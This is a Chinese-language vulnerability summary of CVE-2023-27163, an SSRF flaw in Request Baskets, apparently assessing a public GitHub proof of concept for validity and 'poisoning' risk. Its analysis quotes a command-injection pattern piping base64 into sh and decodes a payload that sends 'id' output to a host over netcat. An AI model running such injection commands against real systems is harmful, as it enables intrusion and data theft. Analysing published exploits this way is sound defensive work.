## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露，内网端口扫描，访问内部服务

**影响版本:** <= 1.2.1

**利用条件:** 需要网络访问，目标应用运行request-baskets <= 1.2.1，并允许创建和访问basket。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request Baskets 1.2.1版本及以下版本中存在的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件发起对内部或外部资源的请求，从而读取敏感信息或攻击其他内部服务。

**有效性分析：**
根据搜索引擎结果和漏洞库信息，该漏洞的POC已公开。提供的POC代码看起来不像是直接攻击`/api/baskets/{name}`这个SSRF端点，而是尝试利用登录页面进行命令注入。这可能是在没有权限创建basket的情况下进行的尝试，或者该实例的配置允许登录。

**投毒风险分析：**
给定的POC代码尝试使用`echo ... | base64 -d | sh`来执行命令，这是一种常见的反弹shell的方式。username参数的值被拼接成了一个shell命令，该命令将一段base64编码的字符串解码后通过sh执行。如果攻击成功，则会在目标服务器上执行任意命令。因此，**存在投毒风险**。`echo` 和 `base64` 是Linux常见的命令，payload部分`aWR8bmMgMTkyLjE2OC40NS4yNDkgODA=`解码后是`id|nc 192.168.45.249 80`，这明显是尝试执行命令并且反弹shell。因此存在投毒风险。由于 POC 本身就是一个反弹shell的尝试，因此判定投毒概率为 10%，主要是考虑命令注入点不一定是预期点。

**利用方式：**
1.  攻击者找到存在漏洞的Request Baskets实例。
2.  攻击者利用`/api/baskets/{name}`组件，构造包含恶意URL的请求。
3.  Request Baskets服务器解析该URL并向目标服务器发起请求。
4.  攻击者可以读取目标服务器返回的内容，或者利用目标服务器的漏洞进行进一步的攻击。根据本次提供的漏洞利用代码，是尝试通过登录界面的username参数进行命令注入，来获取权限后进行利用。

**项目地址:** [btar1gan/exploit_CVE-2023-27163](https://github.com/btar1gan/exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)